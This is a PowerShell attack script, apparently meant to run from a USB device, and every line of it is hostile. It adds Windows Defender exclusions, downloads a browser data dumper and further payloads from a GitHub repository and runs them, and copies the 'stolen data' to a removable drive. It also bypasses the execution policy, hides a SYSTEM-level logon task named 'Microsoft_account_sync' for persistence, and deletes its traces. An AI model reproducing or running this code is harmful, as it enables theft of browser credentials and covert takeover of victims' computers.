# add exclusion to self
Add-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1.exe"
# download info dumper
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
# add exclusion to info dumper
Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
# run info dumper
& "C:\Windows\System32\chromelevator_x64.exe" --output-path "C:\Windows\System32\output" all
# create usbdrive variable
$usbDrive = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
# copy stolen data
Copy-Item -Path 'C:\Windows\System32\output' -Destination "$($usbDrive.DriveLetter):\" -Force
# inform user to remove usb
echo "-------you can safely remove USB--------"
# fetch payloads from github
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "C:\Windows\System32\cleanup.ps1"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/exit.ps1' -OutFile "C:\Windows\System32\exit.ps1"
# add exlusion to file
Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
# add schedule to start ddrcc.ps1
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Microsoft_account_sync" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Windows\System32\ddrcc.ps1"
# remove info dumper
Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
# close terminal
Stop-Process -Name "WindowsTerminal" -Force
